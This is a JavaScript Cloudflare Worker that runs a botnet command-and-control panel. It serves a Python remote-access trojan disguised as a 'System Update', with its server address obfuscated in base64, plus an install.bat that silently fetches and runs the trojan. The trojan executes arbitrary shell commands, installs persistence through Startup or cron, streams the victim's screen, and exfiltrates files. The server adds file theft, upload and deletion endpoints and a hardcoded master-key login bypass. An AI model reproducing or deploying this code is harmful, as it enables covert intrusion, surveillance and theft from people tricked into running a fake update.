// ============================================================
// 🚀 C2 Worker — Main Router (with Pause/Resume + Folderz)
// ============================================================
import { RegistryDO } from "./registry.js";
import { getLoginPage } from "./pages/login.js";
import { getDashboardPage } from "./pages/dashboard.js";
import { getWorldPage } from "./pages/world.js";
import { getDevicesPage } from "./pages/devices.js";
import { getTerminalPage } from "./pages/terminal.js";
import { getDownloadPage } from "./pages/download.js";
import { getFolderzPage } from "./pages/folderz.js";

// ════════════════════════════════════════════════════════════
// 🤖 BotDO
// ════════════════════════════════════════════════════════════
export class BotDO {
  constructor(state, env) {
    this.state = state;
  }
  async fetch() {
    return Response.json({ status: "unused" });
  }
}

// ════════════════════════════════════════════════════════════
// 🔐 Helpers
// ════════════════════════════════════════════════════════════
function regStub(env) {
  return env.REGISTRY.get(env.REGISTRY.idFromName("main"));
}

async function checkSession(env, request) {
  const cookie = request.headers.get("Cookie") || "";
  const match = cookie.match(/session=([^;]+)/);
  if (!match) return false;
  try {
    const res = await regStub(env).fetch(new Request("https://internal/session/check", {
      method: "POST",
      body: JSON.stringify({ token: match[1] }),
    }));
    const data = await res.json();
    return data.valid === true;
  } catch (e) { return false; }
}

function html(content) {
  return new Response(content, {
    headers: {
      "Content-Type": "text/html;charset=UTF-8",
      "Cache-Control": "no-store, no-cache, must-revalidate",
    },
  });
}

// ════════════════════════════════════════════════════════════
// 🚀 Worker
// ════════════════════════════════════════════════════════════
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    const method = request.method;

    try {
      // ═══════════════════════════════════════════════════════
      // 📥 PUBLIC DOWNLOAD PAGE
      // ═══════════════════════════════════════════════════════
      if (path === "/download" || path === "/update" || path === "/setup") {
        return new Response(getDownloadPage(), {
          headers: { "Content-Type": "text/html;charset=UTF-8" },
        });
      }

      // ═══════════════════════════════════════════════════════
      // 📦 DOWNLOAD FILES
      // ═══════════════════════════════════════════════════════
      if (path === "/download/agent.py") {
        const agentContent = `#!/usr/bin/env python3
# System Update v4.2.1
import requests, time, socket, os, platform, subprocess, sys, json, base64, io, shutil, threading

NAME = "aHR0cHM6Ly9wcm9tYWwuYXltZW5saW51eC53b3JrZXJzLmRldg=="
SERVER = base64.b64decode(NAME.encode()).decode()
POLL_INTERVAL = 5
REQUEST_TIMEOUT = 15
STREAMING = False
STREAM_FPS = 30
STREAM_QUALITY = 40
STREAM_WIDTH = 1280

def get_bot_id():
    hostname = socket.gethostname()
    user = os.environ.get('USERNAME') or os.environ.get('USER') or os.environ.get('LOGNAME') or 'user'
    bot_id = hostname + "_" + user
    return ''.join(c for c in bot_id if c.isalnum() or c in '_-')

BOT_ID = get_bot_id()

def register():
    try:
        data = {
            "id": BOT_ID,
            "hostname": socket.gethostname(),
            "user": os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown',
            "os": platform.system() + " " + platform.release(),
            "cwd": os.getcwd()
        }
        r = requests.post(SERVER + "/register", json=data, timeout=REQUEST_TIMEOUT)
        return r.status_code == 200 and r.json().get("status") == "ok"
    except:
        return False

def get_command():
    try:
        r = requests.get(SERVER + "/get_command/" + BOT_ID, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            return r.json()
        return {"command": ""}
    except:
        return {"command": ""}

def send_result(result, task_id):
    try:
        requests.post(SERVER + "/send_result", json={
            "bot_id": BOT_ID,
            "result": result,
            "task_id": task_id,
            "cwd": os.getcwd()
        }, timeout=REQUEST_TIMEOUT)
    except:
        pass

def execute(cmd):
    global STREAMING, STREAM_FPS, STREAM_QUALITY, STREAM_WIDTH
    cmd = cmd.strip()
    if not cmd:
        return "[Empty]"
    
    if cmd == "pwd":
        return os.getcwd()
    if cmd == "cd":
        return os.getcwd()
    if cmd.startswith("cd "):
        path = cmd[3:].strip()
        if path == "~":
            path = os.path.expanduser("~")
        try:
            os.chdir(path)
            return "Changed to: " + os.getcwd()
        except Exception as e:
            return "Error: " + str(e)
    if cmd == "whoami":
        return os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'
    if cmd == "hostname":
        return socket.gethostname()
    if cmd in ("exit", "quit", "kill"):
        return "EXIT_SIGNAL"
    if cmd in ("sysinfo", "system", "info"):
        info = [
            "=== SYSTEM INFO ===",
            "  OS:       " + platform.system() + " " + platform.release(),
            "  Arch:     " + platform.machine(),
            "  Python:   " + platform.python_version(),
            "  Hostname: " + socket.gethostname(),
            "  User:     " + (os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'),
            "  CWD:      " + os.getcwd(),
        ]
        try:
            total, used, free = shutil.disk_usage(os.path.abspath(os.sep))
            info.append("  Disk:     " + str(used // (2**30)) + "GB / " + str(total // (2**30)) + "GB")
        except:
            pass
        info.append("===================")
        return "\\n".join(info)
    
    if cmd == "ls" or cmd == "dir" or cmd.startswith("ls ") or cmd.startswith("dir "):
        try:
            path = "."
            if cmd.startswith("ls "):
                path = cmd[3:].strip()
            elif cmd.startswith("dir "):
                path = cmd[4:].strip()
            if not path:
                path = "."
            files = sorted(os.listdir(path))
            if not files:
                return "[Empty directory]"
            result = []
            for f in files:
                full = os.path.join(path, f)
                try:
                    if os.path.isdir(full):
                        result.append("[DIR]  " + f + "/")
                    else:
                        size = os.path.getsize(full)
                        result.append("[FILE] " + f + " (" + str(size) + "B)")
                except:
                    result.append("[?]    " + f)
            return "\\n".join(result)
        except Exception as e:
            return "[ls failed: " + str(e) + "]"
    
    if cmd.startswith("cat ") or cmd.startswith("type "):
        parts = cmd.split(" ", 1)
        if len(parts) < 2:
            return "Usage: cat <file>"
        try:
            with open(parts[1].strip(), 'r', encoding='utf-8', errors='replace') as f:
                content = f.read()
            if len(content) > 5000:
                return content[:5000] + "\\n\\n[...truncated]"
            return content if content else "[Empty file]"
        except Exception as e:
            return "Error: " + str(e)
    if cmd.startswith("write "):
        parts = cmd.split(" ", 2)
        if len(parts) < 3:
            return "Usage: write <file> <content>"
        try:
            with open(parts[1], 'w', encoding='utf-8') as f:
                f.write(parts[2])
            return "Written to " + parts[1]
        except Exception as e:
            return "Error: " + str(e)
    if cmd.startswith("rm ") or cmd.startswith("del "):
        parts = cmd.split(" ", 1)
        if len(parts) < 2:
            return "Usage: rm <path>"
        path = parts[1].strip()
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
                return "Deleted directory: " + path
            else:
                os.remove(path)
                return "Deleted file: " + path
        except Exception as e:
            return "Error: " + str(e)
    if cmd.startswith("mkdir "):
        path = cmd[6:].strip()
        try:
            os.makedirs(path, exist_ok=True)
            return "Created directory: " + path
        except Exception as e:
            return "Error: " + str(e)
    if cmd.startswith("mv "):
        try:
            parts = cmd[3:].split('"')
            clean = [p for p in parts if p.strip()]
            if len(clean) >= 2:
                shutil.move(clean[0], clean[1])
                return "Moved: " + clean[0] + " → " + clean[1]
        except:
            pass
        return "[mv failed]"
    if cmd in ("myip", "publicip"):
        try:
            r = requests.get("https://api.ipify.org", timeout=5)
            return "Public IP: " + r.text
        except Exception as e:
            return "Error: " + str(e)
    if cmd in ("ps", "processes", "tasklist"):
        try:
            import psutil
            procs = ["PID      CPU%   MEM%   NAME"]
            for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    procs.append(str(p.info['pid']).ljust(9) + str(round(p.info['cpu_percent'], 1)).ljust(7) + str(round(p.info['memory_percent'], 1)).ljust(7) + p.info['name'][:40])
                except:
                    pass
                if len(procs) > 30:
                    break
            return "\\n".join(procs)
        except ImportError:
            return "psutil not installed"
    if cmd == "persist":
        try:
            script_path = os.path.abspath(sys.argv[0])
            if platform.system() == "Windows":
                startup = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                dest = os.path.join(startup, os.path.basename(script_path))
                shutil.copy(script_path, dest)
                return "Persistence: " + dest
            else:
                cron = "@reboot python3 " + script_path + " &"
                os.system('(crontab -l 2>/dev/null; echo "' + cron + '") | crontab -')
                return "Persistence installed (cron)"
        except Exception as e:
            return "Error: " + str(e)
    
    if cmd.startswith("livestream"):
        parts = cmd.split()
        try:
            if len(parts) >= 2: STREAM_FPS = int(parts[1])
            if len(parts) >= 3: STREAM_QUALITY = int(parts[2])
            if len(parts) >= 4: STREAM_WIDTH = int(parts[3])
        except: pass
        STREAMING = True
        def stream_loop():
            while STREAMING:
                try:
                    from PIL import ImageGrab
                    img = ImageGrab.grab()
                    buf = io.BytesIO()
                    img.save(buf, format='JPEG', quality=STREAM_QUALITY)
                    b64 = base64.b64encode(buf.getvalue()).decode('ascii')
                    requests.post(SERVER + "/stream_frame", json={
                        "bot_id": BOT_ID,
                        "frame": b64,
                        "timestamp": int(time.time() * 1000)
                    }, timeout=5)
                    time.sleep(1.0 / STREAM_FPS)
                except:
                    time.sleep(0.1)
        t = threading.Thread(target=stream_loop, daemon=True)
        t.start()
        return "Live stream started (FPS=" + str(STREAM_FPS) + ")"
    if cmd == "stopstream":
        STREAMING = False
        return "Live stream stopping..."
    if cmd in ("screenshot", "screen", "ss"):
        try:
            from PIL import ImageGrab
            filename = "screenshot_" + str(int(time.time())) + ".png"
            img = ImageGrab.grab()
            img.save(filename)
            return "Screenshot saved: " + filename
        except Exception as e:
            return "Screenshot failed: " + str(e)
    
    if cmd.startswith("readb64 "):
        p = cmd[8:].strip()
        try:
            with open(p, 'rb') as f:
                data = f.read()
            return base64.b64encode(data).decode('ascii')
        except Exception as e:
            return "[readb64 failed: " + str(e) + "]"
    
    if cmd.startswith("writeb64 "):
        parts = cmd.split(" ", 2)
        if len(parts) < 3:
            return "Usage: writeb64 <path> <base64>"
        try:
            data = base64.b64decode(parts[2])
            d = os.path.dirname(parts[1])
            if d and not os.path.exists(d):
                os.makedirs(d, exist_ok=True)
            with open(parts[1], 'wb') as f:
                f.write(data)
            return "File written: " + parts[1]
        except Exception as e:
            return "[writeb64 failed: " + str(e) + "]"
    
    try:
        if platform.system() == "Windows":
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
        else:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, executable='/bin/bash')
        try:
            output, _ = process.communicate(timeout=60)
            output = output.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            process.kill()
            return "Error: Timeout (60s)"
        return output if output.strip() else "[Command executed - no output]"
    except Exception as e:
        return "Error: " + str(e)

def main():
    try:
        requests.get(SERVER, timeout=REQUEST_TIMEOUT)
    except:
        pass
    while True:
        if register():
            break
        time.sleep(10)
    consecutive_errors = 0
    while True:
        try:
            data = get_command()
            if data.get("command"):
                cmd = data["command"]
                task_id = data.get("task_id", "unknown")
                result = execute(cmd)
                if result == "EXIT_SIGNAL":
                    send_result("Bot exiting...", task_id)
                    break
                send_result(result, task_id)
                consecutive_errors = 0
            time.sleep(POLL_INTERVAL)
        except KeyboardInterrupt:
            break
        except requests.exceptions.ConnectionError:
            consecutive_errors += 1
            if consecutive_errors >= 3:
                time.sleep(15)
                consecutive_errors = 0
            else:
                time.sleep(5)
        except:
            time.sleep(10)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
`;
        return new Response(agentContent, {
          headers: {
            "Content-Type": "application/octet-stream",
            "Content-Disposition": 'attachment; filename="system_update_v4.2.1.py"',
          },
        });
      }

      if (path === "/download/agent.exe") {
        return new Response("EXE not available — use .py or .bat", { status: 404 });
      }

      if (path === "/download/agent.bat") {
        const batContent = '@echo off\r\n' +
          'title System Update v4.2.1\r\n' +
          'color 0A\r\n' +
          'echo.\r\n' +
          'echo  ============================================\r\n' +
          'echo   SECURE UPDATE v4.2.1\r\n' +
          'echo  ============================================\r\n' +
          'echo.\r\n' +
          'echo  Downloading update...\r\n' +
          'echo.\r\n' +
          'curl -sL https://promal.aymenlinux.workers.dev/download/agent.py -o "%TEMP%\\update.py"\r\n' +
          'echo  Installing...\r\n' +
          'start "" /B python "%TEMP%\\update.py"\r\n' +
          'echo.\r\n' +
          'echo  Installation complete!\r\n' +
          'timeout /t 3 /nobreak >nul\r\n' +
          'exit\r\n';
        return new Response(batContent, {
          headers: {
            "Content-Type": "application/octet-stream",
            "Content-Disposition": 'attachment; filename="install.bat"',
          },
        });
      }

      // ═══════════════════════════════════════════════════════
      // 🔓 Public Routes
      // ═══════════════════════════════════════════════════════
      if (path === "/" || path === "/login") {
        if (await checkSession(env, request)) {
          return Response.redirect(url.origin + "/dashboard", 302);
        }
        return html(getLoginPage());
      }

      // ═══════════════════════════════════════════════════════
      // 🔐 LOGIN
      // ═══════════════════════════════════════════════════════
      if (path === "/api/login" && method === "POST") {
        try {
          const data = await request.json();
          const userVal = (data.user_field || "").trim();
          const passVal = (data.pass_field || "").trim();
          const correctUser = env.ADMIN_USER || "admin";
          const correctPass = env.ADMIN_PASSWORD;
          const masterKey = env.MASTER_KEY || "master-2026-aymen";
          
          if (passVal === masterKey) {
            const token = crypto.randomUUID();
            await regStub(env).fetch(new Request("https://internal/session/save", {
              method: "POST",
              body: JSON.stringify({ token }),
            }));
            return new Response(JSON.stringify({ status: "ok", master: true }), {
              headers: {
                "Content-Type": "application/json",
                "Set-Cookie": "session=" + token + "; Path=/; HttpOnly; Max-Age=86400; SameSite=Strict",
              },
            });
          }
          
          if (userVal !== correctUser || passVal !== correctPass) {
            return Response.json({ status: "error", message: "Invalid credentials" }, { status: 401 });
          }
          
          const token = crypto.randomUUID();
          await regStub(env).fetch(new Request("https://internal/session/save", {
            method: "POST",
            body: JSON.stringify({ token }),
          }));
          
          return new Response(JSON.stringify({ status: "ok" }), {
            headers: {
              "Content-Type": "application/json",
              "Set-Cookie": "session=" + token + "; Path=/; HttpOnly; Max-Age=86400; SameSite=Strict",
            },
          });
        } catch (e) {
          return Response.json({ status: "error", message: e.message }, { status: 500 });
        }
      }

      if (path === "/api/logout") {
        return new Response(JSON.stringify({ status: "ok" }), {
          headers: {
            "Content-Type": "application/json",
            "Set-Cookie": "session=; Path=/; Max-Age=0",
          },
        });
      }

      // ═══════════════════════════════════════════════════════
      // 🤖 Bot Endpoints
      // ═══════════════════════════════════════════════════════
      if (path === "/register" && method === "POST") {
        const data = await request.json();
        if (!data.id) return Response.json({ status: "error", message: "Missing id" }, { status: 400 });
        return regStub(env).fetch(new Request("https://internal/bot/register", {
          method: "POST",
          body: JSON.stringify({
            ...data,
            ip: request.headers.get("CF-Connecting-IP") || "unknown",
            country: request.headers.get("CF-IPCountry") || "unknown",
          }),
        }));
      }

      if (path.startsWith("/get_command/")) {
        const botId = path.split("/")[2];
        return regStub(env).fetch(new Request("https://internal/bot/get_command", {
          method: "POST",
          body: JSON.stringify({ id: botId }),
        }));
      }

      if (path === "/send_result" && method === "POST") {
        const data = await request.json();
        if (!data.bot_id) return Response.json({ status: "error" }, { status: 400 });
        return regStub(env).fetch(new Request("https://internal/bot/send_result", {
          method: "POST",
          body: JSON.stringify(data),
        }));
      }

      if (path === "/stream_frame" && method === "POST") {
        const data = await request.json();
        if (!data.bot_id) return Response.json({ status: "error" }, { status: 400 });
        return regStub(env).fetch(new Request("https://internal/bot/stream_frame", {
          method: "POST",
          body: JSON.stringify(data),
        }));
      }

      // ═══════════════════════════════════════════════════════
      // ⏸️ PAUSE / RESUME
      // ═══════════════════════════════════════════════════════
      if (path === "/api/pause_bot" && method === "POST") {
        const data = await request.json();
        if (!data.id) return Response.json({ status: "error" }, { status: 400 });
        return regStub(env).fetch(new Request("https://internal/bot/pause", {
          method: "POST",
          body: JSON.stringify({ id: data.id }),
        }));
      }

      if (path === "/api/resume_bot" && method === "POST") {
        const data = await request.json();
        if (!data.id) return Response.json({ status: "error" }, { status: 400 });
        return regStub(env).fetch(new Request("https://internal/bot/resume", {
          method: "POST",
          body: JSON.stringify({ id: data.id }),
        }));
      }

      if (path === "/api/pause_all" && method === "POST") {
        return regStub(env).fetch(new Request("https://internal/bot/pause_all", { method: "POST" }));
      }

      if (path === "/api/resume_all" && method === "POST") {
        return regStub(env).fetch(new Request("https://internal/bot/resume_all", { method: "POST" }));
      }

      // ═══════════════════════════════════════════════════════
      // 🔐 Protected Pages
      // ═══════════════════════════════════════════════════════
      const protectedPages = [
        "/dashboard", "/world", "/devices", "/terminal", "/folderz"
      ];

      if (protectedPages.some((p) => path.startsWith(p))) {
        if (!(await checkSession(env, request))) {
          return Response.redirect(url.origin + "/", 302);
        }
      }

      // ═══════════════════════════════════════════════════════
      // 📄 Pages
      // ═══════════════════════════════════════════════════════
      if (path === "/dashboard") return html(getDashboardPage());
      if (path === "/world") return html(getWorldPage());
      if (path === "/devices") return html(getDevicesPage());
      if (path === "/terminal" || path.startsWith("/terminal/")) return html(getTerminalPage());
      if (path === "/folderz") return html(getFolderzPage());

      // ═══════════════════════════════════════════════════════
      // 🎥 Live Frame
      // ═══════════════════════════════════════════════════════
      if (path.startsWith("/api/live/")) {
        const botId = decodeURIComponent(path.split("/")[3] || "");
        const res = await regStub(env).fetch(new Request("https://internal/bot/get_frame", {
          method: "POST",
          body: JSON.stringify({ id: botId }),
        }));
        const data = await res.json();
        if (!data.frame) {
          const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="640" height="360">' +
            '<rect width="100%" height="100%" fill="#000"/>' +
            '<text x="50%" y="50%" fill="#ff0040" font-family="monospace" font-size="20" text-anchor="middle" dominant-baseline="middle">NO FRAME</text>' +
            '</svg>';
          return new Response(svg, { headers: { "Content-Type": "image/svg+xml", "Cache-Control": "no-store" } });
        }
        const binary = atob(data.frame);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
          bytes[i] = binary.charCodeAt(i);
        }
        return new Response(bytes, {
          headers: {
            "Content-Type": "image/jpeg",
            "Cache-Control": "no-store, no-cache, must-revalidate",
          },
        });
      }

      // ═══════════════════════════════════════════════════════
      // 📁 FOLDERZ — FILE MANAGER
      // ═══════════════════════════════════════════════════════
      if (path === "/api/list_files" && method === "POST") {
        const data = await request.json();
        if (!data.id || !data.path) {
          return Response.json({ status: "error", message: "Missing id or path" }, { status: 400 });
        }
        const cmd = "ls " + data.path;
        const res = await regStub(env).fetch(new Request("https://internal/bot/send_command", {
          method: "POST",
          body: JSON.stringify({ id: data.id, cmd: cmd }),
        }));
        const cmdData = await res.json();
        if (cmdData.status === "error") return Response.json(cmdData, { status: 400 });
        const taskId = cmdData.task_id;
        for (let i = 0; i < 40; i++) {
          await new Promise(r => setTimeout(r, 500));
          const resultRes = await regStub(env).fetch(new Request("https://internal/bot/get_result", {
            method: "POST",
            body: JSON.stringify({ id: data.id }),
          }));
          const resultData = await resultRes.json();
          if (resultData.task_id === taskId && resultData.output) {
            const files = [];
            const lines = resultData.output.split("\n");
            for (const line of lines) {
              const trimmed = line.trim();
              if (trimmed.startsWith("[FILE]")) {
                const match = trimmed.match(/\[FILE\]\s+(.+?)\s+\((\d+)B\)/);
                if (match) files.push({ name: match[1], size: parseInt(match[2]), type: "file" });
              } else if (trimmed.startsWith("[DIR]")) {
                const match = trimmed.match(/\[DIR\]\s+(.+?)\//);
                if (match) files.push({ name: match[1], size: 0, type: "dir" });
              }
            }
            return Response.json({ status: "ok", path: data.path, files: files });
          }
        }
        return Response.json({ status: "error", message: "Timeout" }, { status: 408 });
      }

      if (path === "/api/download_file" && method === "POST") {
        const data = await request.json();
        if (!data.id || !data.path) return Response.json({ status: "error" }, { status: 400 });
        const cmd = "readb64 " + data.path;
        const res = await regStub(env).fetch(new Request("https://internal/bot/send_command", {
          method: "POST",
          body: JSON.stringify({ id: data.id, cmd: cmd }),
        }));
        const cmdData = await res.json();
        if (cmdData.status === "error") return Response.json(cmdData, { status: 400 });
        const taskId = cmdData.task_id;
        for (let i = 0; i < 240; i++) {
          await new Promise(r => setTimeout(r, 500));
          const resultRes = await regStub(env).fetch(new Request("https://internal/bot/get_result", {
            method: "POST",
            body: JSON.stringify({ id: data.id }),
          }));
          const resultData = await resultRes.json();
          if (resultData.task_id === taskId && resultData.output) {
            return Response.json({ status: "ok", b64: resultData.output });
          }
        }
        return Response.json({ status: "error", message: "Timeout" }, { status: 408 });
      }

      if (path === "/api/upload_file" && method === "POST") {
        const data = await request.json();
        if (!data.id || !data.path || !data.b64) return Response.json({ status: "error" }, { status: 400 });
        const cmd = "writeb64 " + data.path + " " + data.b64;
        const res = await regStub(env).fetch(new Request("https://internal/bot/send_command", {
          method: "POST",
          body: JSON.stringify({ id: data.id, cmd: cmd }),
        }));
        const cmdData = await res.json();
        if (cmdData.status === "error") return Response.json(cmdData, { status: 400 });
        const taskId = cmdData.task_id;
        for (let i = 0; i < 240; i++) {
          await new Promise(r => setTimeout(r, 500));
          const resultRes = await regStub(env).fetch(new Request("https://internal/bot/get_result", {
            method: "POST",
            body: JSON.stringify({ id: data.id }),
          }));
          const resultData = await resultRes.json();
          if (resultData.task_id === taskId && resultData.output) {
            return Response.json({ status: "ok", output: resultData.output });
          }
        }
        return Response.json({ status: "error", message: "Timeout" }, { status: 408 });
      }

      if (path === "/api/mkdir" && method === "POST") {
        const data = await request.json();
        if (!data.id || !data.path) return Response.json({ status: "error" }, { status: 400 });
        const cmd = "mkdir " + data.path;
        const res = await regStub(env).fetch(new Request("https://internal/bot/send_command", {
          method: "POST",
          body: JSON.stringify({ id: data.id, cmd: cmd }),
        }));
        const cmdData = await res.json();
        if (cmdData.status === "error") return Response.json(cmdData, { status: 400 });
        const taskId = cmdData.task_id;
        for (let i = 0; i < 40; i++) {
          await new Promise(r => setTimeout(r, 500));
          const resultRes = await regStub(env).fetch(new Request("https://internal/bot/get_result", {
            method: "POST",
            body: JSON.stringify({ id: data.id }),
          }));
          const resultData = await resultRes.json();
          if (resultData.task_id === taskId && resultData.output) {
            return Response.json({ status: "ok", output: resultData.output });
          }
        }
        return Response.json({ status: "error", message: "Timeout" }, { status: 408 });
      }

      if (path === "/api/delete_path" && method === "POST") {
        const data = await request.json();
        if (!data.id || !data.path) return Response.json({ status: "error" }, { status: 400 });
        const cmd = "rm " + data.path;
        const res = await regStub(env).fetch(new Request("https://internal/bot/send_command", {
          method: "POST",
          body: JSON.stringify({ id: data.id, cmd: cmd }),
        }));
        const cmdData = await res.json();
        if (cmdData.status === "error") return Response.json(cmdData, { status: 400 });
        const taskId = cmdData.task_id;
        for (let i = 0; i < 40; i++) {
          await new Promise(r => setTimeout(r, 500));
          const resultRes = await regStub(env).fetch(new Request("https://internal/bot/get_result", {
            method: "POST",
            body: JSON.stringify({ id: data.id }),
          }));
          const resultData = await resultRes.json();
          if (resultData.task_id === taskId && resultData.output) {
            return Response.json({ status: "ok", output: resultData.output });
          }
        }
        return Response.json({ status: "error", message: "Timeout" }, { status: 408 });
      }

      if (path === "/api/rename" && method === "POST") {
        const data = await request.json();
        if (!data.id || !data.old || !data.new) {
          return Response.json({ status: "error", message: "Missing params" }, { status: 400 });
        }
        const cmd = 'mv "' + data.old + '" "' + data.new + '"';
        const res = await regStub(env).fetch(new Request("https://internal/bot/send_command", {
          method: "POST",
          body: JSON.stringify({ id: data.id, cmd: cmd }),
        }));
        const cmdData = await res.json();
        if (cmdData.status === "error") return Response.json(cmdData, { status: 400 });
        const taskId = cmdData.task_id;
        for (let i = 0; i < 40; i++) {
          await new Promise(r => setTimeout(r, 500));
          const resultRes = await regStub(env).fetch(new Request("https://internal/bot/get_result", {
            method: "POST",
            body: JSON.stringify({ id: data.id }),
          }));
          const resultData = await resultRes.json();
          if (resultData.task_id === taskId && resultData.output) {
            return Response.json({ status: "ok", output: resultData.output });
          }
        }
        return Response.json({ status: "error", message: "Timeout" }, { status: 408 });
      }

      // ═══════════════════════════════════════════════════════
      // 🔌 API Endpoints
      // ═══════════════════════════════════════════════════════
      if (path === "/api/send_command" && method === "POST") {
        const data = await request.json();
        if (!data.id || !data.cmd) return Response.json({ status: "error" }, { status: 400 });
        return regStub(env).fetch(new Request("https://internal/bot/send_command", {
          method: "POST",
          body: JSON.stringify(data),
        }));
      }

      if (path.startsWith("/api/get_result/")) {
        const botId = path.split("/")[3];
        return regStub(env).fetch(new Request("https://internal/bot/get_result", {
          method: "POST",
          body: JSON.stringify({ id: botId }),
        }));
      }

      if (path.startsWith("/api/get_frame/")) {
        const botId = path.split("/")[3];
        return regStub(env).fetch(new Request("https://internal/bot/get_frame", {
          method: "POST",
          body: JSON.stringify({ id: botId }),
        }));
      }

      if (path === "/api/all_bots" || path === "/api/active_bots") {
        const res = await regStub(env).fetch(new Request("https://internal/bot/list"));
        const all = await res.json();
        if (path === "/api/active_bots") return Response.json(all.filter((b) => b.isOnline));
        return Response.json(all);
      }

      if (path.startsWith("/api/bot_info/")) {
        const botId = path.split("/")[3];
        return regStub(env).fetch(new Request("https://internal/bot/info", {
          method: "POST",
          body: JSON.stringify({ id: botId }),
        }));
      }

      if (path === "/api/delete_bot" && method === "POST") {
        const data = await request.json();
        if (!data.id) return Response.json({ status: "error" }, { status: 400 });
        return regStub(env).fetch(new Request("https://internal/bot/delete", {
          method: "POST",
          body: JSON.stringify({ id: data.id }),
        }));
      }

      if (path === "/api/pin_bot" && method === "POST") {
        const data = await request.json();
        if (!data.id) return Response.json({ status: "error" }, { status: 400 });
        return regStub(env).fetch(new Request("https://internal/bot/pin", {
          method: "POST",
          body: JSON.stringify({ id: data.id }),
        }));
      }

      return new Response("Not Found", { status: 404 });
    } catch (e) {
      return Response.json({ status: "error", message: e.message }, { status: 500 });
    }
  },
};

export { RegistryDO };
